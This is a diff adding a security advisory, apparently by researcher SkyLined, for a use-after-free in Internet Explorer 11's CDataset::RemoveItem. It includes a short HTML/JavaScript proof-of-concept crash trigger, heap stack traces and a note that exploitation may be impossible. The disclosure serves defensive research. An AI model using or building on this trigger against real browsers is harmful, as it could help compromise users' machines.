@@ -1,0 +1,67 @@
+1338m - MSIE 11 CDataset::RemoveItem use-after-free
+=====================================
+
+Synopsis
+--------
+Specially crafted HTML can trigger a use-after-free in Microsoft Internet
+Explorer 11.
+
+Known affected software and attack vectors
+------------------------------------------
++ MSIE 11
+  An attacker would need to get a target user to open a specially crafted
+  webpage. JavaScript appears to be required to trigger the issue.
+
+Repro.html
+-----------
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      </head>
+      <script>
+        var oOption = new Option();
+        oOption.dataset.a = 1;
+        var oObserver = new MutationObserver(function(){});
+        oObserver.observe(oOption,{"attributes":true});
+        delete oOption.dataset.a;
+      </script>
+    </html>
+
+Description
+-----------
+Relevant stack at time of free according to page heap:
+    00007ffd3d9d1f0f ntdll!RtlDebugFreeHeap+0x47
+    00007ffd3d98ae85 ntdll!RtlpFreeHeap+0x75365
+    00007ffd3d915948 ntdll!RtlFreeHeap+0x368
+    00007ffd16de65c1 MSHTML!CAttrValue::Free+0x7a
+    00007ffd16b960f9 MSHTML!CAttrArray::Destroy+0xa1
+    00007ffd17138a36 MSHTML!CBase::removeAttributeDispid+0x136
+    00007ffd177cb7f3 MSHTML!CDataset::RemoveItem+0xf3
+    00007ffd17769b2b MSHTML!CDOMStringMapTypeOperations::DeleteProperty+0xab
+    00007ffd167838dc jscript9!Js::CustomExternalObject::DeletePropertyImpl<1>+0x1705cc
+    00007ffd1660b448 jscript9!Js::JavascriptOperators::DeleteProperty+0x40
+    00007ffd1654a6fd jscript9!Js::JavascriptOperators::OP_DeleteProperty+0x5d
+    00007ffd1654a73c jscript9!Js::InterpreterStackFrame::Process+0x6558
+    00007ffd164ce4c0 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x386
+
+Relevant stack at time of reuse:
+    00007ffd`177cb823 MSHTML!CDataset::RemoveItem+0x123
+    00007ffd`17769b2b MSHTML!CDOMStringMapTypeOperations::DeleteProperty+0xab
+    00007ffd`167838dc jscript9!Js::CustomExternalObject::DeletePropertyImpl<1>+0x1705cc
+    00007ffd`1660b448 jscript9!Js::JavascriptOperators::DeleteProperty+0x40
+    00007ffd`1654a6fd jscript9!Js::JavascriptOperators::OP_DeleteProperty+0x5d
+    00007ffd`1654a73c jscript9!Js::InterpreterStackFrame::Process+0x6558
+    00007ffd`164ce4c0 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x386
+
+Exploit
+-------
+From looking at the stacks, the reuse seems to happen almost immediately after
+the free, which may indicate exploitation is impossible. However, I did not
+investigate further.
+
+Credit
+------
+If you can confirm this as a security issue and would like to provide credits
+for reporting the issue in your advisory, please credit "SkyLined".
